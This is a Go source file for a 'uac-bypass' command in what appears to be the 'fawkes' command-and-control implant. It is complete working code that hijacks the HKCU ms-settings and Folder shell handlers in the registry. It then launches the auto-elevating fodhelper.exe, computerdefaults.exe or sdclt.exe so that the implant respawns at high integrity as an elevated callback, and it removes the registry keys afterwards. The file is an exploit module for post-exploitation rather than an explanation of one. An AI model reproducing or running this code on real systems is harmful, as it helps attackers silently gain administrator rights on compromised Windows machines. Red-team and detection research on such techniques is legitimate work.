//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"time"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

// UACBypassCommand implements UAC bypass techniques for medium → high integrity escalation
type UACBypassCommand struct{}

func (c *UACBypassCommand) Name() string {
	return "uac-bypass"
}

func (c *UACBypassCommand) Description() string {
	return "Bypass User Account Control to elevate from medium to high integrity"
}

type uacBypassArgs struct {
	Technique string `json:"technique"` // fodhelper, computerdefaults, sdclt
	Command   string `json:"command"`   // command to run elevated (default: self)
}

func (c *UACBypassCommand) Execute(task structs.Task) structs.CommandResult {
	var args uacBypassArgs
	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error parsing parameters: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
	}

	if args.Technique == "" {
		args.Technique = "fodhelper"
	}

	// Check if already elevated — UAC bypass is unnecessary
	if isElevated() {
		return structs.CommandResult{
			Output:    "Already running at high integrity (elevated). UAC bypass not needed.\nUse getsystem to escalate to SYSTEM.",
			Status:    "success",
			Completed: true,
		}
	}

	// Default: spawn a new copy of ourselves for an elevated callback
	if args.Command == "" {
		exe, err := os.Executable()
		if err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error getting executable path: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
		args.Command = exe
	}

	switch strings.ToLower(args.Technique) {
	case "fodhelper":
		return uacBypassMsSettings(args.Command, `C:\Windows\System32\fodhelper.exe`, "fodhelper")
	case "computerdefaults":
		return uacBypassMsSettings(args.Command, `C:\Windows\System32\computerdefaults.exe`, "computerdefaults")
	case "sdclt":
		return uacBypassSdclt(args.Command)
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown technique: %s. Use: fodhelper, computerdefaults, sdclt", args.Technique),
			Status:    "error",
			Completed: true,
		}
	}
}

// isElevated checks if the current process token is elevated
func isElevated() bool {
	var token windows.Token
	err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY, &token)
	if err != nil {
		return false
	}
	defer token.Close()
	return token.IsElevated()
}

// uacBypassMsSettings implements the ms-settings registry hijack used by both
// fodhelper.exe and computerdefaults.exe. Both auto-elevate and read
// HKCU\Software\Classes\ms-settings\Shell\Open\command for the handler.
func uacBypassMsSettings(command, triggerBinary, techniqueName string) structs.CommandResult {
	var output string
	output += fmt.Sprintf("[*] UAC Bypass Technique: %s\n", techniqueName)
	output += fmt.Sprintf("[*] Trigger binary: %s\n", triggerBinary)
	output += fmt.Sprintf("[*] Elevated command: %s\n\n", command)

	regKeyPath := `Software\Classes\ms-settings\Shell\Open\command`

	// Step 1: Create the registry key and set command
	output += "[*] Step 1: Setting registry key...\n"
	key, _, err := registry.CreateKey(registry.CURRENT_USER, regKeyPath, registry.SET_VALUE)
	if err != nil {
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("Error creating HKCU\\%s: %v", regKeyPath, err),
			Status:    "error",
			Completed: true,
		}
	}

	// Set (Default) value to our command
	if err := key.SetStringValue("", command); err != nil {
		key.Close()
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("Error setting command value: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Set DelegateExecute to empty string — this is critical.
	// Without it, Windows uses the normal ms-settings protocol handler.
	// With an empty DelegateExecute, Windows falls back to the (Default) command value.
	if err := key.SetStringValue("DelegateExecute", ""); err != nil {
		key.Close()
		cleanupMsSettingsKey()
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("Error setting DelegateExecute: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	key.Close()
	output += fmt.Sprintf("[+] Registry set: HKCU\\%s\n", regKeyPath)

	// Step 2: Launch the auto-elevating trigger binary
	output += "[*] Step 2: Launching trigger binary...\n"
	cmd := exec.Command(triggerBinary)
	if err := cmd.Start(); err != nil {
		cleanupMsSettingsKey()
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("Error launching %s: %v", triggerBinary, err),
			Status:    "error",
			Completed: true,
		}
	}
	output += fmt.Sprintf("[+] Launched %s (PID: %d)\n", triggerBinary, cmd.Process.Pid)

	// Step 3: Wait briefly then clean up registry
	time.Sleep(2 * time.Second)
	output += "[*] Step 3: Cleaning up registry...\n"
	cleanupMsSettingsKey()
	output += "[+] Registry keys removed\n\n"

	output += "[+] UAC bypass triggered successfully.\n"
	output += "[*] If successful, a new elevated callback should appear shortly.\n"
	output += "[*] The elevated process runs at high integrity (admin)."

	return structs.CommandResult{
		Output:    output,
		Status:    "success",
		Completed: true,
	}
}

// cleanupMsSettingsKey removes the ms-settings hijack registry keys
func cleanupMsSettingsKey() {
	// Delete in reverse order: deepest key first
	_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings\Shell\Open\command`)
	_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings\Shell\Open`)
	_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings\Shell`)
	_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings`)
}

// uacBypassSdclt implements the sdclt.exe Folder handler hijack.
// sdclt.exe auto-elevates and reads HKCU\Software\Classes\Folder\shell\open\command.
func uacBypassSdclt(command string) structs.CommandResult {
	var output string
	output += "[*] UAC Bypass Technique: sdclt\n"
	output += fmt.Sprintf("[*] Trigger binary: C:\\Windows\\System32\\sdclt.exe\n")
	output += fmt.Sprintf("[*] Elevated command: %s\n\n", command)

	regKeyPath := `Software\Classes\Folder\shell\open\command`

	// Step 1: Create the registry key and set command
	output += "[*] Step 1: Setting registry key...\n"
	key, _, err := registry.CreateKey(registry.CURRENT_USER, regKeyPath, registry.SET_VALUE)
	if err != nil {
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("Error creating HKCU\\%s: %v", regKeyPath, err),
			Status:    "error",
			Completed: true,
		}
	}

	// Set (Default) value to our command
	if err := key.SetStringValue("", command); err != nil {
		key.Close()
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("Error setting command value: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// DelegateExecute must be set (empty string) for the Folder handler too
	if err := key.SetStringValue("DelegateExecute", ""); err != nil {
		key.Close()
		cleanupSdcltKey()
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("Error setting DelegateExecute: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	key.Close()
	output += fmt.Sprintf("[+] Registry set: HKCU\\%s\n", regKeyPath)

	// Step 2: Launch sdclt.exe
	output += "[*] Step 2: Launching sdclt.exe...\n"
	cmd := exec.Command(`C:\Windows\System32\sdclt.exe`)
	if err := cmd.Start(); err != nil {
		cleanupSdcltKey()
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("Error launching sdclt.exe: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	output += fmt.Sprintf("[+] Launched sdclt.exe (PID: %d)\n", cmd.Process.Pid)

	// Step 3: Wait briefly then clean up registry
	time.Sleep(2 * time.Second)
	output += "[*] Step 3: Cleaning up registry...\n"
	cleanupSdcltKey()
	output += "[+] Registry keys removed\n\n"

	output += "[+] UAC bypass triggered successfully.\n"
	output += "[*] If successful, a new elevated callback should appear shortly.\n"
	output += "[*] The elevated process runs at high integrity (admin)."

	return structs.CommandResult{
		Output:    output,
		Status:    "success",
		Completed: true,
	}
}

// cleanupSdcltKey removes the Folder handler hijack registry keys
func cleanupSdcltKey() {
	_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\Folder\shell\open\command`)
	_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\Folder\shell\open`)
	_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\Folder\shell`)
	// Don't delete Software\Classes\Folder — it may have legitimate content
}
